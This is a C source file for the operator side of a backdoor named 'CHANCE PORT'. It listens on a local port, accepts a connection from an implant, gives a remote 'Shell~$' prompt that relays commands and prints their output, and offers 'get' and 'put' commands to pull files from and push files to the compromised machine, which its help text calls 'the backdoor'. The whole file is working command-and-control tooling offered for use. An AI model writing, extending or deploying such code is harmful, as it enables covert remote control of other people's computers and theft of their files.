// include Libs
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

/*
    _____________________
    |                   |
    |    CHANCE PORT    |
    |___________________|

*/

// define some macros
#define PORT 8088 // Connection port
#define IP "127.0.0.1"
#define BUFFER_SIZE 4096

/* Function prototypes */

// initialize handler
int init_handler(int *soket);

// Send Command
int snd_command(int clSoket, char *command);

// Get Command output
int get_output(int clSoket);

// handle connection
int handle(int soket, int *clSoket);

// Get file from Client
int getfile(int clSoket); // Get file name and get file

// Send file to Client
int sndfile(int clSoket); // Get file name and send file

// User interface
void ui(int soket, int clSoket);

// Help menu
void help();


// Main func
int main(int argc, char const *argv[])
{
    // Handler Socket and Client Socket
    int soket, client;

    // init server
    if (init_handler(&soket) != 0)
    {
        // End of program
        return 1;
    }

    // Handle connection
    if (handle(soket, &client) != 0)
    {
        // End of program
        return 1;
    }

    // Start user interface
    ui(soket, client);

    // Close Sockets
    close(soket);
    close(client);

    return 0;
}

/* Function Bodies */

// initialize handler
int init_handler(int *soket)
{
    // Make handler socket
    *soket = socket(AF_INET, SOCK_STREAM, 0);
    if (*soket < 0) // Handle error
    {
        // Print error
        fprintf(stderr, "\nError: Unable to create socket\n");
        return 1;
    }

    // Make struct for handler Socket
    struct sockaddr_in addr;
    addr.sin_addr.s_addr = inet_addr(IP); // Local address
    addr.sin_port = htons(PORT); // Selected Port (8088)
    addr.sin_family = AF_INET; // Use IPv4

    // Bind Socket
    if (bind(*soket, (struct sockaddr*)&addr, sizeof(addr)) < 0) // handle errors
    {
        // Print error
        fprintf(stderr, "\nError: Unable to bind socket\n");
        return 1;
    }

    // Listen Socket
    if (listen(*soket, 1) < 0)
    {
        // Print error
        fprintf(stderr, "\nError: Unable to listen on socket\n");
        return 1;
    }

    // Turn Success
    return 0;
}


// Send Command
int snd_command(int clSoket, char *command)
{
    if (send(clSoket, command, strlen(command), 0) < 0)
    {
        // Print error
        fprintf(stderr, "\nError: Unable to send command\n");
        return 1;
    }
    return 0; // Return success
}


// Get Command output
int get_output(int clSoket)
{
    // define output char variable
    char output[2048];
    memset(output, 0, sizeof(output)); // Clear the buffer

    // Get output
    int bytes_received = recv(clSoket, output, sizeof(output) - 1, 0); // Leave space for null terminator
    if (bytes_received < 0) // Handle error
    {
        // Print error
        fprintf(stderr, "\nError: Unable to receive output\n");
        return 1;
    }

    output[bytes_received] = '\0'; // Null-terminate the string

    // Print output
    printf("\nCommand output:\n%s", output);
    return 0; // Return success
}


// handle connection
int handle(int soket, int *clSoket)
{
    // Print listening now
    printf("Listening...");

    // Make a struct for Client socket
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    // Handle connection
    *clSoket = accept(soket, (struct sockaddr*)&addr, &len);
    if (*clSoket < 0) // Handle error
    {
        // Print error
        fprintf(stderr, "\nError: Unable to accept connection\n");
        return 1;
    }

    // Return success
    return 0;
}


// Get file from Client
int getfile(int clSoket) // Get file name and get file
{
    // File name
    char fname[100];

    // Get file name
    printf("\nEnter a file name to get file from connection: ");
    if (fgets(fname, sizeof(fname), stdin) == NULL) // Handle connection
    {
        fprintf(stderr, "Error reading file name\n");
        return 1;
    }

    // Remove new line char
    fname[strcspn(fname, "\n")] = 0;

    // Send request to client
    if (send(clSoket, fname, strlen(fname), 0) < 0) // Handle error
    {
        fprintf(stderr, "\nError: Unable to send file request\n");
        return 1;
    }

    // Receive file size from client
    int fileSize;
    if (recv(clSoket, &fileSize, sizeof(fileSize), 0) <= 0) // Handle error
    {
        fprintf(stderr, "Error: failed to receive file size\n");
        return 1;
    }

    // Check for invalid file size
    if (fileSize < 0) {
        fprintf(stderr, "Error: invalid file size\n");
        return 1;
    }

    // Open file
    FILE *fl = fopen(fname, "wb"); // Use "wb" for binary write
    if (fl == NULL) // Handle connection
    {
        fprintf(stderr, "Error opening file\n");
        return 1;
    }

    // Receive file from client
    char buffer[BUFFER_SIZE];
    int bytes_received;
    int total_received = 0;
    while (total_received < fileSize && (bytes_received = recv(clSoket, buffer, BUFFER_SIZE, 0)) > 0) // Handle error
    {
        // Write the file
        fwrite(buffer, 1, bytes_received, fl);
        total_received += bytes_received;
    }

    if (bytes_received < 0) // Error handling
    {
        perror("Error receiving file");
        fclose(fl);
        return 1;
    }

    if (total_received != fileSize) {
        fprintf(stderr, "Error: received file size does not match expected size\n");
        fclose(fl);
        return 1;
    }

    fclose(fl); // Close file
    return 0;
}


// Send file to Client
int sndfile(int clSoket) // Get file name and send file
{
    // File name
    char fname[100];

    // Get file name
    printf("\nEnter a file name to send to connection: ");
    if (fgets(fname, sizeof(fname), stdin) == NULL) // Handle error
    {
        fprintf(stderr, "Error reading file name\n");
        return 1;
    }

    // Remove new line char
    fname[strcspn(fname, "\n")] = 0;

    // Open file
    FILE *fl = fopen(fname, "rb"); // Use "rb" for binary read
    if (fl == NULL) // Handle error
    {
        fprintf(stderr, "Error opening file\n");
        return 1;
    }

    // Send file size
    fseek(fl, 0, SEEK_END);
    int fileSize = ftell(fl);
    rewind(fl);

    // Check for empty file
    if (fileSize <= 0) {
        fprintf(stderr, "Error: file is empty\n");
        fclose(fl);
        return 1;
    }

    if (send(clSoket, &fileSize, sizeof(fileSize), 0) < 0) // Handle error
    {
        fprintf(stderr, "\nError: Unable to send file size\n");
        fclose(fl);
        return 1;
    }

    // Send file
    char buffer[BUFFER_SIZE];
    int bytes_read;
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, fl)) > 0) // Handle error
    {
        // Send file
        if (send(clSoket, buffer, bytes_read, 0) < 0) // Handle error
        {
            // Print error
            fprintf(stderr, "\nError: Unable to send file\n");
            fclose(fl);
            return 1;
        }
    }

    if (bytes_read < 0) // Error handling
    {
        perror("Error reading file");
        fclose(fl);
        return 1;
    }

    fclose(fl); // Close file
    return 0;
}


// User interface
void ui(int soket, int clSoket)
{
    // Some variables
    char command[200] = {0};

    while (1)
    {
        // Reset command
        memset(command, 0, sizeof(command));

        // print ui
        printf("\nShell~$ ");

        // Get command
        if (fgets(command, sizeof(command), stdin) == NULL) // Handle error
        {
            fprintf(stderr, "Error reading command\n");
            break;
        }

        command[strcspn(command, "\n")] = 0; // Remove newline

        /* Check Special commands */

        // Get file from client
        if (strcmp(command, "get") == 0)
        {
            // Get file
            if (getfile(clSoket) != 0) 
            {
                fprintf(stderr, "Error getting file\n");
            }
            continue;
        }

        // Send file to client
        if (strcmp(command, "put") == 0)
        {
            // send file
            if (sndfile(clSoket) != 0) 
            {
                fprintf(stderr, "Error sending file\n");
            }
            continue;
        }

        // if handle close connections
        if (strcmp(command, "exit") == 0 || strcmp(command, "close") == 0)
        {
            // Send we are closing
            if (send(clSoket, "exit", 5, 0) != 0) return;

            return; // Close
        }

        // Send file to client
        if (strcmp(command, "help") == 0)
        {
            // Spawn help menu
            help();

            continue;
        }
        
        // Send Command
        if (snd_command(clSoket, command) != 0 || get_output(clSoket) != 0)
        {
            fprintf(stderr, "Error executing command\n");
        }
    }
}

// Help menu
void help()
{
    printf("help -> show you this help page\nget -> for getting file on the backdoor\nput -> send file to backdoor\n\n");
}

